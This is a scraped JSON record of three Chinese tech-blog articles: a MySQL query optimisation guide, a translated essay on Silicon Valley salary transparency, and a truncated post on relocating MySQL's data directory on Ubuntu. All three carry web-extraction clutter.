[{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/11/b47d2553927cc1dd89135026466da892.png"], "title": "SQL优化指南", "create_time": "2018/11/06", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,不该相遇在秋天,   ,\n,慢查询日志 开启撒网模式,\n,开启了MySQL慢查询日志之后，MySQL会自动将执行时间超过指定秒数的SQL统统记录下来，这对于搜罗线上慢SQL有很大的帮助。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSHOW VARIABLES LIKE 'slow%',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SHOW ,VARIABLES ,LIKE, ,'slow%',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,以我刚安装的mysql5.7为例 查询结果是这样子的：,\n,\n,slow_launch_time,：表示如果建立线程花费了比这个值更长的时间,slow_launch_threads 计数器将增加,\n,slow_query_log,：是否开启慢查询日志 ON开启，OFF关闭 默认没有开启,\n,slow_query_log_file,：日志保存路径,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSHOW VARIABLES LIKE 'long%',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SHOW ,VARIABLES ,LIKE, ,'long%',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,\n,long_query_time,：达到多少秒的sql就记录日志,\n,客户端可以用set设置变量的方式让慢查询开启，但是个人不推荐，因为真实操作起来会有一些问题，比如说，重启MySQL后就失效了，或者是开启了慢查询，我又去改变量值，它就不生效了。,\n,编辑MySQL的配置文件：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nvim /etc/my.cnf,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,vim, ,/,etc,/,my,.,cnf,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,加入如下三行：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n　　slow_query_log=ON\r\n　　slow_query_log_file=/var/lib/mysql/localhost-centos-slow.log\r\n　　long_query_time=3,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,　　,slow_query_log,=,ON,　　,slow_query_log_file,=,/,var,/,lib,/,mysql,/,localhost,-,centos,-,slow,.,log,　　,long_query_time,=,3,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,我这里设置的是3秒,\n,重启MySQL,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsystemctl restart mysqld;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,systemctl ,restart ,mysqld,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,服务器开一个监控：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntail -f /var/lib/mysql/localhost-centos-slow.log,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tail, ,-,f, ,/,var,/,lib,/,mysql,/,localhost,-,centos,-,slow,.,log,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,客户端走一条SQL：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT SLEEP(3),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT ,SLEEP,(,3,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,此时发现sql已经被记录到日志里了。（有时候不一定，我看到很多博客讲的是超过指定秒数，但我实验得出的结果是达到指定秒数）,\n,EXPLAIN 点对点分析你,\n,explain是一个神奇的命令，可以查看sql的具体的执行计划。,\n,以一条联查sql为例：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT a.id,a.cn_name,a.role_id,r.name\r\nFROM tb_usr_admins a\r\nINNER JOIN tb_base_roles r ON r.id=a.role_id\r\nWHERE a.cn_name=\"接单人员\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT, ,a,.,id,,,a,.,cn_name,,,a,.,role_id,,,r,.,name,FROM ,tb_usr,_,admins, ,a,INNER ,JOIN ,tb_base,_,roles, ,r, ,ON, ,r,.,id,=,a,.,role_id,WHERE, ,a,.,cn_name,=,\"接单人员\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,查询结果是：,\n,\n,加上explain命令来执行：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEXPLAIN\r\nSELECT a.id,a.cn_name,a.role_id,r.name\r\nFROM tb_usr_admins a\r\nINNER JOIN tb_base_roles r ON r.id=a.role_id\r\nWHERE a.cn_name=\"接单人员\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,EXPLAIN,SELECT, ,a,.,id,,,a,.,cn_name,,,a,.,role_id,,,r,.,name,FROM ,tb_usr,_,admins, ,a,INNER ,JOIN ,tb_base,_,roles, ,r, ,ON, ,r,.,id,=,a,.,role_id,WHERE, ,a,.,cn_name,=,\"接单人员\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,查询结果是：,\n,\n,这就是这条SQL的执行计划，下面来说明一下这个执行计划怎么看,\n,id,：代表优先级  id值越大，越先执行，id值相同，从上往下执行。（比如示例的这条sql的执行计划，就是先执行第一行，再执行第二行）,\n,select_type,：表示select类型 取值如下,\n,simple 简单表 即不使用表连接或者子查询,\nprimary 包含union或者子查询的主查询 即外层的查询,\nunion UNION中的第二个或者后面的查询语句,\nsubquery 一般子查询中的子查询被标记为subquery，也就是位于select列表中的查询,\nderived 派生表 该临时表是从子查询派生出来的,\n等等,\n,type,：表示MySQL在表中查找数据的方式，或者叫访问类型，以下对于type取值的说明 从上往下性能由最差到最好,\n,all:全表扫描，MySQL遍历全表来找到匹配的行,\nindex：索引全扫描，MySQL遍历挣个索引来查询匹配的行,\nrange：索引范围扫描，常见于<、<=、>、>=、between等操作符,\nref：使用非唯一索引或唯一索引的前缀扫描，返回匹配的单行数据,\neq_ref：类似ref，区别就在于使用的索引是唯一索引，简单来说，就是多表连接中使用primary key或者unique index作为关联条件。,\nconst/system：单表中最多有一个匹配行，查询起来非常迅速，常见于根据primary key或者唯一索引unique index进行的单表查询,\nnull：mysql不用访问表或者索引，直接就能够得到查询的结果，例如select 1+2 as result。,\n,possible_keys,：表示查询时可能使用的索引,\n,key,：表示实际使用的索引,\n,key_len,：使用到索引字段的长度,\n,rows,：扫描数量,\n,Extra,：执行情况的说明和描述，包含不适合在其他列中显示但是对执行计划非常重要的额外信息，常用取值如下：,\n,Using index：直接访问索引就取到了数据，高性能的表现。,\nUsing where：直接在主键索引上过滤数据，必带where子句，而且用不上索引,\nUsing index condition：先条件过滤索引，再查数据，,\nUsing filesort：使用了外部文件排序 只要见到这个 就要优化掉,\nUsing temporary：创建了临时表来处理查询 只要见到这个 也要尽量优化掉,\n,优化争议无数的count(),\n,统计列与统计行？,\n,COUNT()是一个特殊的函数，有两种不同的作用，它可以统计某个列值的数量，也可以统计行数。,\n,在统计列值的时候要求列值是非空的，也就是不统计null。,\n,当我们统计行的时候，常见的是COUNT(*)，这种情况下，通配符*并不会像我们猜想的那样扩展成所有的列，实际上，它会忽略所有的列而直接统计所有的行数,\n,解密MyiSAM的‘快’,\n,这是一个容易产生误解的事情：MyiSAM的count()函数总是非常快。,\n,不过它是有前提条件的，条件是没有任何where条件的count(*)才非常快，因为此时无须实际的去计算表的行数，mysql可以利用存储引擎的特性直接获得这个值，如果mysql知道某列不可能有null值，那么mysql内部会将count(列)表达式优化为count(*)。,\n,当统计带有where条件的查询，那么mysql的count()和其他存储引擎就没有什么不同了。,\n,COUNT(1)、COUNT(*)、COUNT(列),\n,（先提前申明，本人是在innodb库里做的实验。）,\n,1.count(1)和count(*)直接就是统计主键，他们两个的效率是一样的。如果删除主键，他们都走全表扫描。,\n,2.如果count(列)中的字段是索引的话，count(列)和count(*)一样快，否则count(列)走全表扫描。,\n,优化order by 语句,\n,MySQL的排序方式,\n,优化order by语句就不得不了解mysql的排序方式。,\n,1.第一种通过有序索引返回数据，这种方式的extra显示为Using Index,不需要额外的排序，操作效率较高。,\n,2.第二种是对返回的数据进行排序，也就是通常看到的Using filesort，filesort是通过相应的排序算法，将数据放在sort_buffer_size系统变量设置的内存排序区中进行排序，如果内存装载不下，它就会将磁盘上的数据进行分块，再对各个数据块进行排序，然后将各个块合并成有序的结果集。,\n,filesort的优化,\n,了解了MySQL排序的方式，优化目标就清晰了：尽量减少额外的排序，通过索引直接返回有序数据。where条件和order by使用相同的索引。,\n,1.创建合适的索引减少filesort的出现。,\n,2.查询时尽量只使用必要的字段，select 具体字段的名称，而不是select * 选择所有字段，这样可以减少排序区的使用，提高SQL性能。,\n,优化group by 语句,\n,为什么order by后面不能跟group by ?,\n,事实上，MySQL在所有的group by 后面隐式的加了order by ，也就是说group by语句的结果会默认进行排序。,\n,如果你要在order by后面加group by ，那结果执行的SQL是不是这样：select * from tb order by … group by … order by … ？ 这不是搞笑吗？,\n,禁止排序,\n,既然知道问题了，那么就容易优化了，如果查询包括group by但又不关心结果集的顺序，而这种默认排序又导致了需要文件排序，则可以指定order by null 禁止排序。,\n,例如：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect * from tb group by name order by null;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select *, ,from ,tb ,group ,by ,name ,order ,by ,null,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,优化limit 分页,\n,一个非常常见又非常头痛的场景：‘limit 1000,20’。,\n,这时MySQL需要查询1020条记录然后只返回最后20条，前面的1000条都将被抛弃，这样的代价非常高。如果所有页面的访问频率都相同，那么这样的查询平均需要访问半个表的数据。,\n,第一种思路 在索引上分页,\n,在索引上完成分页操作，最后根据主键关联回原表查询所需要的其他列的内容。,\n,例如：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM tb_user LIMIT 1000,10,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,tb_user ,LIMIT, ,1000,,,10,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,可以优化成这样：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM tb_user u \r\nINNER JOIN (SELECT id FROM tb_user LIMIT 1000,10) AS b ON b.id=u.id,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,tb,_,user, ,u, ,INNER ,JOIN, ,(,SELECT ,id ,FROM ,tb_user ,LIMIT, ,1000,,,10,), ,AS, ,b, ,ON, ,b,.,id,=,u,.,id,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,第二种思路 将limit转换成位置查询,\n,这种思路需要加一个参数来辅助，标记分页的开始位置：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM tb_user WHERE id > 1000 LIMIT 10,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,tb_user ,WHERE ,id, ,>, ,1000, ,LIMIT, ,10,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,优化子查询,\n,子查询，也就是查询中有查询，常见的是where后面跟一个括号里面又是一条查询sql,\n,尽可能的使用join关联查询来代替子查询。,\n,当然 这不是绝对的，比如某些非常简单的子查询就比关联查询效率高，事实效果如何还要看执行计划。,\n,只能说大部分的子查询都可以优化成Join关联查询。,\n,改变执行计划,\n,提高索引优先级,\n,use index, 可以让MySQL去参考指定的索引，但是无法强制MySQL去使用这个索引，当MySQL觉得这个索引效率太差，它宁愿去走全表扫描。。。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM tb_user USE INDEX (user_name),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,tb_user ,USE, ,INDEX, ,(,user_name,),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,注意：必须是索引，不能是普通字段，（亲测主键也不行）。,\n,忽略索引,\n,ignore index, 可以让MySQL忽略一个索引,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM tb_user IGNORE INDEX (user_name) WHERE user_name=\"张学友\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,tb_user ,IGNORE ,INDEX, ,(,user_name,), ,WHERE ,user_name,=,\"张学友\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,强制使用索引,\n,force index, 使用了force index 之后 尽管效率非常低，MySQL也会照你的话去执行,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM tb_user FORCE INDEX (user_name) WHERE user_name=\"张学友\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,tb_user ,FORCE ,INDEX, ,(,user_name,), ,WHERE ,user_name,=,\"张学友\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,个人分享,\n,查看执行计划时建议依次观察以下几个要点：,\n,1.SQL内部的执行顺序。,\n2.查看select的查询类型。,\n3.实际有没有使用索引。,\n4.Extra描述信息,\n,PS:一定要养成查看执行计划的习惯，这个习惯非常重要。,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114482/", "url_object_id": "525873ae47480e5115c1da9dee9c61ac", "front_image_path": "full/5e1320055e1d116508c18b94fc1b894a60b8b67d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/11/89f21f4108d88a3eabb105a24c0f4fad.jpeg"], "title": "反对薪酬保密，一程序员公开了硅谷秘密", "create_time": "2018/11/07", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Jackie Luo,   译文出处：,36kr,   ,讨论报酬水平是职场的大忌。因为这样可能会被公司炒鱿鱼。但是硅谷的软件工程师 Jackie Luo 提出，为了报酬的公平性需要提高透明度，因为只有员工才能提供公司所需的技能和经验，公司不能一手遮天。而透明性的提高需要所有员工的积极参与。她的呼吁得到了很多技术员工的响应，这篇文章就是她发现的硅谷员工的薪酬秘密。,\n,\n,我是一名软件工程师，有 3 年的工作经验，在 Square 工作，这是一家总部位于旧金山的上市公司。我每年能赚 13 万美元，外加价值 47500 美元的股票，也就是每年 177500 美元。,\n,基本工资我没有跟他们谈。不过我的确把 4 年股票赠与从 15 万美元谈到了 19 万美元。我是在 2 月 5 号入职的。那笔赠与目前的价值是 412390.02 美元（煤炭都会波动）。如果按照这个股价行权第一年的话，我真正的报酬是 233097.51 美元。,\n,透露这一切令我感到害怕。陌生人和同行看到我挣的钱后认为我拿得太多了。（“开玩笑吧？她都干了什么能拿到这样的工资水平？”）要么他们也许会认为我拿得太少。（“如果她拿这么少的话那一定是工作不怎样。”）将来打算雇我的公司必然都会看到我之前的薪水然后将我未来的薪水锚定之前的水平，从而限制了我换工作时的涨薪水平，或者因为害怕我这个人太贵而将我排除在面试名单之外。,\n,既然这样我为什么还要分享这些数字？因为我们需要更多地讨论有关我们拿多少报酬的事情。公平报酬始于更大的透明度。,\n,在今天，性别、种族、阶层以及无数其他的身份标识在技术业的系统性偏见中都扮演着自己的角色。2018 年的一份雇佣报告发现，男性在技术业拿到的报酬要高于女性，在同一家公司担任相同角色的情况下 63% 的时候男性都要高于女性。54% 的技术女性报告说自己拿到的钱要比担任同一角色的男性要少。,\n,但我们有一个有关报酬的真诚对话可以缩小差距的乐观理由。意识到存在报酬差异的人当中有 66% 者只是在跟同事聊到报酬的情况时才知道这件事情的存在。,\n,硅谷真正的财富是通过股权产生的。,\n,通常当大家讨论报酬——该接受什么，该拒绝什么，如何协商的时候，建议总是“知道你的价值。”但怎么才能知道？对于大多数员工来说，报酬被锁在一个黑箱里面，而处在职场最上层阶梯的人掌握着所有的信息。只需要把他们支付的报酬数据给收集众多客户相关数字的机构，他们通常能获取到有关市场给特定角色开出的平均薪酬的信息，并且还能拿到聚合的分析。这种信息不对称造成了权力的失衡，只有一端，也即是更有权力的一方能够做出关于报酬支付的知情决定。,\n,典型的场景是这样的：你接受了一家公司的面试，在电话筛选上花费了几个小时，并且完成了现场面试。你表现很好。准备拿到 offer。当然了，招聘人员会打电话给你，问你想开出的报酬是多少。,\n,这个时候你就开始恐慌了。如果你报出的数字太高怎么办？你不希望公司因此不给你这个 offer 了——你需要一份工作并且已经走完了整个面试流程，所以你不希望破坏这个机会。可如果你报得太低呢？你不希望贱卖自己，而你现在协商的报酬，在你拿到那份工作之前，将决定你未来几年的报酬。拥有类似资格的其他人拿到的报酬如何？你完全就是在黑暗中乱开枪。,\n,纠正这种不平衡的努力的确有（比如 Glassdoor、Comparably 以及 Levels 这类的服务），但是聚合报酬数据的匿名平台并不能替代我们的真正需要：一种将公开讨论报酬正常化的文化。,\n,因为有感于作家 Carina Hsieh 以及#talkpay 运动，在三八国际妇女节那天我发了一条推特。它向技术界的男性发出来公开邀请，请他们与我分享自己的工资好让我可以匿名地发布出去。,\n,即便在今天，相对于自己的同行，女性以及被忽视的少数族裔还是频繁地拿到过低的报酬，而他们甚至都没有意识到这一点，因为他们没有太多的比较点。我以为会有少数人愿意直接给我发信息。,\n,迄今为止，已经有 50 万人看到了那条推特。成千上万的人已经直接私信我。大家发送了很多的工资信息给我，多到我仍然还没有把我收到的数据公布完，差得还远呢。,\n,我们保守薪水的秘密是因为我们害怕会因为分享这些数据而受到惩罚。,\n,全世界各种角色的技术员工都把自己的薪水数据发给了我，但因为我是一名湾区的软件工程师，所以我最大的数据集来自这里。那么，湾区的男性软件工程师拿到的薪水有多少呢？以下就是我对这场讨论的贡献：,\n,软件工程师开发了你每天使用的各种网站和 app。湾区的软件工程角色往往从 6 位数起步：120000 美元是 4 年大学生涯刚刚毕业的计算机科学专业拿到的典型的基本工资，这是由大型上市技术公司设定的标准。新毕业生去到小一点的初创企业能拿到的薪水可能会比这要低一点，但通常哪怕是初创企业也会支付 6 位数的工资。早期阶段初创企业给的钱最少，而真正令人安逸之心的薪酬数字只会出现在最大型的“初创企业”那里，比如 Uber、Lyft 以及 AirBnb。,\n,\n,加州技术业的工资概况,\n,初创企业和上市公司的一大差异化因素是股权。初创企业的股权到头来往往一文不值，但是上市公司的股权则代表着报仇的一大部分。基本的工资很少会涨到 40 万美元以上——实际上我还没有见过——但股票则可以令工程师的整体薪酬翻番或者甚至翻 3 番。而且跟工资不一样的是，股票在价值上可以飙涨，如果你是目睹了股价坐火箭的 Google 员工或者你是一家初创企业的第一名工程师而那家公司后来被高价收购的话这一点是真的。硅谷的真正财富是通过股权产生的。,\n,尤其是 Facebook 和 Google 对于迫切需要的人才开出的薪酬是最丰厚的。尽管市场竞争激烈，但如果你听说一位工程师的总报酬达到 75 万美元的话，那一定是非常不典型的。很有可能他们是在 Facebook 或者 Google 工作，而且是全世界稍有的几个具备行业经验与专业知识能从事相关工作的人。他们就是戴着“金手套”的人：理论上他们可以在任何地方找到一份工作，但是他们无法离开（或者至少他们认为自己不能离开），因为没有一个竞争对手能配得上他们的报酬。,\n,大家通常会担心自己会因为分享自己的收入而被炒鱿鱼。,\n,如果让我来猜测湾区软件工程师的平均总薪酬（基本工资、股权加奖金）的话，我想大概在 150000 美元到 200000 美元之间。这个估计得到了我从 Twitter 收到的数据的支持，其中位数是 183750 美元。根据 Glassdoor，工程师的平均基本工资是 137000 美元，奖金为 11000 美元，这还没有包括股票奖励。,\n,\n,美国技术工资概况,\n,这个数字已经不少了，所以这个话题的敏感性也不足为奇。尽管如此，我对披露报酬数字给我的人的害怕程度仍然准备不足，很多人一而再再而三地向我强调这一信息只能匿名发出。好几位甚至还要求自己的工作城市和职位细节信息要尽可能写得含糊，以防自己正好被对上号。大家往往会担心自己因为分享收入信息而被炒鱿鱼。,\n,对待透明性的态度是文化已经受到严重破坏的迹象。我们如何得到报酬塑造了我们得日常生活的一切：我们可以在哪里生活，可以做什么，可以有多大的自由。在收入方面更清楚了解到我们所处的位置完全是我们的利益所在，但是我们还是要保守这一信息秘密，因为我们害怕会由于分享而受到惩罚。在一个本该极其重视透明性的行业里，我们在最需要透明性的地方却恰恰存在不足。,\n,让我们改变这一权力格局吧。跟你的同事讨论，跟你的业界同行讨论，跟你的朋友讨论自己拿到了多少报酬。跟你团队里面的女性和少数族裔讨论。不要仅仅讨论工资，要讨论整体报酬包括股权和奖金在内。讨论相关过程，比如你的报酬如何改变了自己的职业生涯路径以及协商报酬最后对拿到 offer 的影响会怎样。邀请他们也做同样的事情。,\n,大家的共同看法是公司在就业市场拥有一切权力因为就业机会是它们赋予的。但员工才是提供公司所需技能和经验的人。知道自己应该拿多少让你在一个通常不钟爱于你的体系里面多少有一点权力——而你应该运用这种权力。,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114488/", "url_object_id": "b8895923b325bd572e1e15a4aae6a066", "front_image_path": "full/8d3f910003336d6f3b381d88a58bc579a95eba56.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "Ubuntu 上更改 MySQL 数据库数据存储目录", "create_time": "2018/11/07", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,潇湘隐者,   ,之前写过一篇博客“,MySQL更改数据库数据存储目录,”，当时的测试环境是RHEL和CentOS，谁想最近在Ubuntu下面更改MySQL数据库数据存储目录时遇到了之前未遇到的问题，之前的经验用不上了（或者说之前的总结不是太全面），修改完MySQL数据库数据存储目录后重启MySQL，发现MySQL服务无法启动。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@mylnx2:/etc/mysql/mysql.conf.d# service mysql start\r\n \r\nJob for mysql.service failed because the control process exited with error code. See \"systemctl status mysql.service\" and \"journalctl -xe\" for details.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,mylnx2,:,/,etc,/,mysql,/,mysql,.,conf,.,d,# service mysql start, ,Job ,for, ,mysql,.,service ,failed ,because ,the ,control ,process ,exited ,with ,error ,code,., ,See, ,\"systemctl status mysql.service\", ,and, ,\"journalctl -xe\", ,for, ,details,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,连MySQL的错误日志也未生成，使用service mysql status命令可以输出一些较详细的信息，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@mylnx2:/etc/mysql/mysql.conf.d# service mysql status\r\n● mysql.service - MySQL Community Server\r\n   Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled)\r\n   Active: activating (start-post) (Result: exit-code) since Mon 2018-10-15 22:33:00 CST; 28s ago\r\n  Process: 12947 ExecStart=/usr/sbin/mysqld (code=exited, status=1/FAILURE)\r\n  Process: 12932 ExecStartPre=/usr/share/mysql/mysql-systemd-start pre (code=exited, status=0/SUCCESS)\r\n Main PID: 12947 (code=exited, status=1/FAILURE);         : 12948 (mysql-systemd-s)\r\n    Tasks: 2\r\n   Memory: 1.9M\r\n      CPU: 367ms\r\n   CGroup: /system.slice/mysql.service\r\n           └─control\r\n             ├─12948 /bin/bash /usr/share/mysql/mysql-systemd-start post\r\n             └─13045 sleep 1\r\n \r\nOct 15 22:33:00 mylnx2 systemd[1]: Starting MySQL Community Server...\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.013763Z 0 [Warning] Changed limits: max_open_files: 1024 (requested 5000)\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.013836Z 0 [Warning] Changed limits: table_open_cache: 431 (requested 2000)\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.207533Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.207663Z 0 [Warning] Can't create test file /mysql_data/mysql/mylnx2.lower-test\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.207717Z 0 [Note] /usr/sbin/mysqld (mysqld 5.7.23-0ubuntu0.16.04.1-log) starting as process 129\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.215413Z 0 [Warning] Can't create test file /mysql_data/mysql/mylnx2.lower-test\r\nOct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.215445Z 0 [Warning] Can't create test file /mysql_data/mysql/mylnx2.lower-test\r\nOct 15 22:33:01 mylnx2 systemd[1]: mysql.service: Main process exited, code=exited, 